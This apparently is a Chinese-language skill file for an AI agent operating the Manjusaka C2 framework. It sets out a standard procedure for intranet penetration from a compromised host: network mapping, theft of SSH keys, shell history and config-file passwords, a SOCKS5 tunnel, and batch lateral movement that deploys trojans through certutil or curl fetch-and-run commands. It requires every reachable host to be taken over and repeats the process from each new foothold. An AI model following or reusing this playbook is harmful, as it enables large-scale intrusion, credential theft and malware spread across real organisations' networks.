---
description: 内网渗透标准作业流程：从已控主机出发，网段测绘 → 凭据攫取 → SOCKS5 隧道 → 木马/SSH 双通道批量横向，发现的每一台可达主机都必须推进上线，禁止只挑一台
version: 1.0.0
author: manjusaka
tags:
  - intranet
  - lateral-movement
  - batch-online
---

# 内网渗透 SOP

从单台已控主机出发的标准化内网渗透流程：信息收集 → 凭据攫取 → 隧道建立 → 批量横向上线 → 全量纳管。核心纪律：**发现的每一台可达主机都要推进上线，拿到 N 组凭据就要尝试上线 N 台主机，禁止只上线一台就停下**。

## 0. 核心纪律（先读这个）

1. **批量横向是硬要求**：内网拿到 6 个凭据/发现 6 台可达主机，就必须逐台尝试上线 6 台，而不是只挑一台。
2. **上线判定**：木马通道以 `nps_list_hosts` 中出现新 agent 为准；SSH 通道以 `nps_create_ssh` 返回 `connected=true` 为准。
3. **木马通道主机上线后 npc2=false 时立即 `nps_load_npc2`**（需 1-2 分钟，轮询 `nps_list_hosts` 确认 npc2=true），否则无法执行命令/文件/插件类工具。**SSH 主机不能也不需 nps_load_npc2**，命令执行类工具对它不适用（用 NPS Web 终端/文件管理器操作）。
4. **只读优先**：信息收集阶段不写文件、不改配置；必须写时只进临时目录（Linux `/tmp`，Windows `%TEMP%`）。
5. **不装软件**：只用目标系统自带工具（ping / certutil / curl / sc / wmic / net），禁止 apt/yum/pip/npm 安装任何依赖。
6. **破坏性操作先确认**：删文件、关服务、清日志、提权动作必须先向操作者报告影响范围并等待确认。
7. **证据留痕**：每拿到一组凭据、每上线一台主机，用 `nps_memory_store` 记录并汇报目标 ID 与结果。

## 1. 阶段一：跳板机自检

| 步骤 | 工具 | 判定 |
|---|---|---|
| 看当前全部主机 | `nps_list_hosts`（不传 project_id，含 SSH 直连主机） | 得到 agent 清单与 npc2 状态 |
| 跳板 npc2 未加载 | `nps_load_npc2(agent_id)` → 轮询 `nps_list_hosts` | npc2=true 才能继续 |
| 确认项目归属 | `nps_list_projects` | 横向上线统一归入同一现有项目，不要每台建新项目 |

## 2. 阶段二：内网测绘（只读）

在跳板机用 `nps_execute_command` 执行（全部用系统自带命令）：

- **网段与路由**: Windows `ipconfig /all` + `route print`；Linux `ip addr` + `ip route`
- **ARP 表**（同网段存活）: `arp -a` / `ip neigh`
- **存活探测**: Windows `for /L %i in (1,1,254) do @ping -n 1 -w 200 192.168.x.%i`；Linux 逐段 `ping -c1 -W1`
- **连接关系**: `netstat -ano`（跳板自身连接暴露内网服务端点）
- **域名信息**: `hostname` + `net view /domain`（有域时优先摸清域控位置）

产出一张**主机清单**：IP / 开放端口 / 系统 / 用途（数据库/运维机/域控），用 `nps_memory_store` 存档。这张清单就是后面阶段五的上线任务列表。

## 3. 阶段三：凭据攫取

按性价比排序：

1. **跳板本地翻文件**（`nps_list_dir` + `nps_read_file`）：数据库连接串、`~/.ssh/id_rsa` 与 `known_hosts`、bash/PowerShell history、RDP 连接记录、各类配置文件里的明文口令
2. **插件辅助**：`nps_list_plugins`（传 agent_id 看平台兼容性）选凭据抓取类插件，`nps_plugin_exec` 执行
3. **网络侧弱口令**：用跳板上已有客户端验证（数据库客户端、SSH 客户端），不自带工具就跳过

每拿到一组凭据立即 `nps_memory_store` 留痕，并标记它对应主机清单里的哪台目标机。

## 4. 阶段四：建立隧道

```
nps_create_socks5(agent_id=<跳板机>, port=<1-65535>)
```

- 在 NPS 本地开 SOCKS5 端口进入目标内网，供不可直连目标使用
- **一条隧道服务所有横向动作**，不要每台主机开一条
- 返回的代理地址格式即 `nps_create_ssh` 的 `proxy` 参数值：`socks5://[user:pass@]host:port`

## 5. 阶段五：批量横向上线（核心）

**对主机清单里的每一台可达主机，逐台选择通道上线：**

| 目标条件 | 通道 | 动作 |
|---|---|---|
| 可出网 | 木马 | `nps_create_agent(project_id, os, arch)` → 拿返回的一键 `command` 回跳板机 `nps_execute_command` 执行 → 轮询 `nps_list_hosts` 确认新 agent 出现 |
| 不可出网 + 有 SSH 凭据 | SSH 直连 | `nps_create_ssh(host, username, password/private_key 二选一, proxy=socks5://...)` → 以返回 `connected=true` 判定上线 |
| 不可出网 + 无凭据 | 暂缓 | 保留在主机清单，从已上线机器扩大凭据面后回访 |

要点：

- **项目归属**：木马通道主机统一上到同一项目（复用 `nps_list_projects` 现有项目）；SSH 主机不归属项目，`nps_list_hosts` **不传 project_id** 才能看到
- Windows 目标优先用 `nps_create_agent` 返回的 `certutil` 一键命令，Linux 优先 `curl` 拉取执行形式（都在返回的 `command` 字段里）
- `nps_create_agent` 的下载链接 4 小时有效，过期重新生成
- SSH 凭据错误的返回会明确说明原因（凭据错误/代理不可达/超时），修正后直接重试，不会有残留数据

## 6. 阶段六：全量纳管与循环加深

对每台新上线的**木马通道**主机：

1. `nps_load_npc2(agent_id)` → 轮询 `nps_list_hosts` 确认 npc2=true
2. 回到**阶段二**以它为新跳板继续测绘（新网段、新凭据、新主机清单）
3. 循环直到主机清单全部覆盖或操作者叫停

SSH 主机作为已控凭据资产记录在案（Web 终端可用），继续横向的跳板优先用木马通道主机。

收尾汇报：`nps_list_hosts` 全量清单（agent_id / IP / 系统 / npc2 / 上线通道），凭据与关键发现用 `nps_memory_store` 归档。

## 工具速查

| 工具 | 关键参数 | 所处阶段 |
|---|---|---|
| `nps_list_projects` | 无 | 1 / 5 |
| `nps_list_hosts` | `project_id`(可选) | 全程 |
| `nps_load_npc2` | `agent_id` | 1 / 6 |
| `nps_execute_command` | `agent_id`, `command`, `timeout` | 2 / 5 |
| `nps_list_dir` / `nps_read_file` | `agent_id`, `path` | 3 |
| `nps_list_plugins` / `nps_plugin_exec` | `agent_id`, `name`, `args` | 3 |
| `nps_create_socks5` | `agent_id`, `port` | 4 |
| `nps_create_agent` | `project_id`, `os`, `arch` | 5 |
| `nps_create_ssh` | `host`, `username`, `password`/`private_key`, `port`, `proxy`, `note` | 5 |
| `nps_memory_store` | 记忆写入 | 全程留痕 |

完整入参出参说明见 `ManjusakaC2` skill（`nps_skill_read` 读取）。
